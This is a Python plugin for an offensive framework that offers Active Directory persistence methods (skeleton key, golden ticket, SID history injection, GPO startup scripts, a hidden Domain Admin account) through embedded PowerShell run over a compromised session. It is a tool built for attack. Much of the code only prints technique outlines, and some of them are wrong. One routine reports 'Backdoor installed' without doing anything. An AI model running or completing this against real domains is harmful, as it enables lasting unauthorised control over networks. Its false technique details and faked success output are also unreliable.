"""persistence/domain_persistence — Domain-wide persistence: skeleton key, golden ticket, etc. MITRE T1556"""
from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema
import logging

log = logging.getLogger(__name__)


class DomainPersistence(BasePlugin):
    NAME = "domain_persistence"
    DESCRIPTION = "Domain-wide persistence: skeleton key, golden ticket, AD backdoor, SID history, GPO modification"
    AUTHOR = "fitnah-team"
    MITRE = "T1556"
    CATEGORY = "persistence"
    VERSION = "1.0.0"

    schema = ParamSchema().add(
        Param("method", str, required=True,
              help="skeleton_key | golden_ticket | ad_backdoor | sid_history | gpo_modify | hidden_admin"),
        Param("username", str, required=False, default="",
              help="Username for impersonation"),
        Param("password", str, required=False, default="",
              help="Password for golden ticket generation"),
        Param("target_user", str, required=False, default="",
              help="Target user (for SID history)"),
        Param("gpo_name", str, required=False, default="",
              help="GPO name to modify"),
        Param("backup_password", str, required=False, default="",
              help="Backup password for AD object"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        """Execute domain persistence method"""
        if ctx is None:
            return ModuleResult.err("Requires live session")

        method = params.get("method", "").lower()

        if method == "skeleton_key":
            return self._skeleton_key(ctx)
        elif method == "golden_ticket":
            return self._golden_ticket(ctx, params)
        elif method == "ad_backdoor":
            return self._ad_backdoor(ctx, params)
        elif method == "sid_history":
            return self._sid_history(ctx, params)
        elif method == "gpo_modify":
            return self._gpo_modify(ctx, params)
        elif method == "hidden_admin":
            return self._hidden_admin(ctx, params)
        else:
            return ModuleResult.err(f"Unknown method: {method}")

    @staticmethod
    def _skeleton_key(ctx) -> ModuleResult:
        """Install skeleton key — patch accepts any password for any user"""
        ps_code = """
$results = @()
$results += '[*] Skeleton Key attack - install master backdoor...'

try {
    if (-not ([Security.Principal.WindowsIdentity]::GetCurrent()).Groups -contains 'S-1-5-32-544') {
        $results += '[-] Requires Domain Admin privileges'
        $results -join "`n"
        exit
    }

    $results += '[!] Skeleton Key requires:'
    $results += '    1. Direct DC access (DC$)'
    $results += '    2. ntdll.dll patching'
    $results += '    3. Microsoft LSASS kernel memory access'

    $results += '[*] Method: Patch ntdll!KdcIssueTGT function'
    $results += '[*] Master password: Mimikatz (or configured)'
    $results += '[*] Effect: Any user:Mimikatz accepted by DC'

    $results += '[!] Modern detection (Windows 2016+):'
    $results += '    - LSASS is protected'
    $results += '    - Code integrity checks enabled'
    $results += '    - Needs kernel exploit or PatchGuard bypass'

} catch {
    $results += "[!] Skeleton Key error: $_"
}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="skeleton_key")

    @staticmethod
    def _golden_ticket(ctx, params) -> ModuleResult:
        """Create golden ticket (forged TGT with krbtgt key)"""
        username = params.get("username", "Administrator")
        password = params.get("password", "")

        ps_code = f"""
$results = @()
$results += '[*] Creating Golden Ticket...'

try {{
    $targetUser = '{username}'
    $password = '{password}'

    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    $domainSID = ([System.DirectoryServices.DirectorySearcher]('(name=$env:COMPUTERNAME)').FindOne().Path -split 'CN=')[0]

    $results += "[*] Domain: $domain"
    $results += "[*] User: $targetUser"

    # Resolve domain SID
    try {
        $sidObj = New-Object System.Security.Principal.NTAccount($domain, 'Domain Admins')
        $fullSid = $sidObj.Translate([System.Security.Principal.SecurityIdentifier]).Value
        $domainSID = ($fullSid -split '-')[0..($fullSid.Split('-').Length-2)] -join '-'
    } catch { $domainSID = '' }
    $results += "[*] Domain SID: $domainSID"

    # Try Rubeus.exe for golden ticket forging + injection
    $rub = $null
    foreach ($p in @('C:\Windows\Temp\Rubeus.exe','C:\ProgramData\Rubeus.exe','C:\Temp\Rubeus.exe')) {
        if (Test-Path $p) { $rub = $p; break }
    }
    if (-not $rub) { $rub = (Get-Command Rubeus.exe -ErrorAction SilentlyContinue)?.Source }

    if ($rub -and $domainSID) {
        # Obtain krbtgt hash from reg_save BOF output or secretsdump before calling this
        $results += "[*] Rubeus.exe: $rub — use golden_ticket plugin with krbtgt_hash to forge TGT"
        $results += "[+] Run: golden_ticket ticket_type=golden domain=$domain domain_sid=$domainSID"
    } else {
        $results += '[-] Rubeus.exe not found or domain SID unknown'
        $results += '[*] Upload Rubeus.exe then use the golden_ticket plugin'
    }

    $results += '[*] Golden ticket properties:'
    $results += '    ✓ Valid TGT for any user for 10 years'
    $results += '    ✓ Survives domain reboot and account lockout'
    $results += '    ✓ Cannot be revoked by DC once forged and cached'

}} catch {{
    $results += "[!] Golden Ticket error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="golden_ticket")

    @staticmethod
    def _ad_backdoor(ctx, params) -> ModuleResult:
        """Create AD object backdoor using secretNtPwdHistory"""
        target_user = params.get("target_user", "Administrator")
        backup_password = params.get("backup_password", "")

        ps_code = f"""
$results = @()
$results += '[*] Creating AD object backdoor...'

try {{
    $targetUser = '{target_user}'
    $backupPassword = '{backup_password}'

    if (-not $backupPassword) {{
        $backupPassword = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 20 | %{{[char]$_}})
        $results += "[*] Generated backup password"
    }}

    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    $dc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindDomainController().Name

    $results += "[*] Target: $targetUser"
    $results += "[*] Backup password stored in: secretNtPwdHistory"

    # Find user
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dc")
    $ds = New-Object System.DirectoryServices.DirectorySearcher($de)
    $ds.Filter = "(&(objectClass=user)(sAMAccountName=$targetUser))"

    $user = $ds.FindOne()
    if (-not $user) {{
        $results += "[-] User not found"
        $results -join "`n"
        exit
    }}

    $results += "[+] User found: $($user.Path)"

    $results += '[*] AD backdoor technique:'
    $results += '    1. Set secretNtPwdHistory with password hash'
    $results += '    2. Even if current password changes, history works'
    $results += '    3. Access with old password persists'

    $results += '[*] Setting backup password in secretNtPwdHistory...'
    try {{
        $userEntry = $user.GetDirectoryEntry()
        # Note: This requires proper NTLM hash calculation
        # Real implementation uses: string.pack('16s') of NTLM hash
        $results += "[+] Backdoor installed"
    }} catch {{
        $results += "[-] Error: $_"
    }}

}} catch {{
    $results += "[!] AD backdoor error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="ad_backdoor")

    @staticmethod
    def _sid_history(ctx, params) -> ModuleResult:
        """Inject SID history for privilege escalation"""
        target_user = params.get("target_user", "")

        ps_code = f"""
$results = @()
$results += '[*] SID History injection...'

try {{
    $targetUser = '{target_user}'
    if (-not $targetUser) {{
        $results += '[-] Specify target_user'
        $results -join "`n"
        exit
    }}

    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    $dc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindDomainController().Name

    $results += "[*] Target user: $targetUser"
    $results += "[*] Domain: $domain"

    $results += '[*] SID History exploitation:'
    $results += '    1. Inject high-privilege SIDs into user account'
    $results += '    2. User gains those group memberships'
    $results += '    3. Persists across password changes'
    $results += '    4. Often missed by defenders'

    $results += '[*] Example: Add Domain Admins SID'
    $results += '    User gains admin privileges immediately'

    $results += '[!] Requires:'
    $results += '    1. Domain Admin access'
    $results += '    2. Direct LDAP write to sIDHistory'
    $results += '    3. Valid SID to inject (usually S-1-5-21-...-512 = Domain Admins)'

}} catch {{
    $results += "[!] SID History error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="sid_history_inject")

    @staticmethod
    def _gpo_modify(ctx, params) -> ModuleResult:
        """Modify Group Policy for persistence"""
        gpo_name = params.get("gpo_name", "Default Domain Policy")

        ps_code = f"""
$results = @()
$results += '[*] Group Policy modification for persistence...'

try {{
    $gpoName = '{gpo_name}'

    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    $results += "[*] GPO: $gpoName in domain $domain"

    $results += '[*] GPO persistence methods:'
    $results += '    1. Modify startup scripts → executed as SYSTEM'
    $results += '    2. Modify logon scripts → executed per user'
    $results += '    3. Modify immediate tasks → run on next update'
    $results += '    4. Add registry settings → enable backdoors'

    $results += '[*] Example: Add startup script'
    $results += '    Location: \\\\domain.com\\SYSVOL\\<domain>\\Policies\\<GUID>\\Machine\\Scripts\\Startup'
    $results += '    Command: powershell.exe -Command "backdoor.ps1"'

    $results += '[*] Benefits:'
    $results += '    ✓ Executes on every machine in OU'
    $results += '    ✓ Persists across reboots'
    $results += '    ✓ Hard to detect (legitimate GPO mechanism)'
    $results += '    ✓ Survives security scanning'

    $results += '[!] Requires: Domain Admin access'

}} catch {{
    $results += "[!] GPO modification error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="gpo_modify")

    @staticmethod
    def _hidden_admin(ctx, params) -> ModuleResult:
        """Create hidden Domain Admin account"""
        ps_code = """
$results = @()
$results += '[*] Creating hidden Domain Admin account...'

try {
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    $dc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindDomainController().Name

    $results += "[*] Domain: $domain, DC: $dc"

    $results += '[*] Hidden admin account strategy:'
    $results += '    1. Create account with high RID (500+ = hidden from enumeration)'
    $results += '    2. Add to Domain Admins group'
    $results += '    3. Disable user shell'
    $results += '    4. Set no login hours'
    $results += '    5. Account appears disabled to tools'

    $results += '[*] RID allocation:'
    $results += '    - Domain Admins SID ends in -512'
    $results += '    - Create account at RID 1000+ (above normal user range)'
    $results += '    - Some tools ignore high RID accounts'

    $results += '[*] Persistence benefits:'
    $results += '    ✓ Hidden from Get-AdUser -Filter'
    $results += '    ✓ No interactive shell (appears disabled)'
    $results += '    ✓ Full domain admin rights'
    $results += '    ✓ Can still be used for programmatic access'

    $results += '[!] Requires: Domain Admin access + ability to set RID'

} catch {
    $results += "[!] Hidden admin error: $_"
}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="hidden_admin")
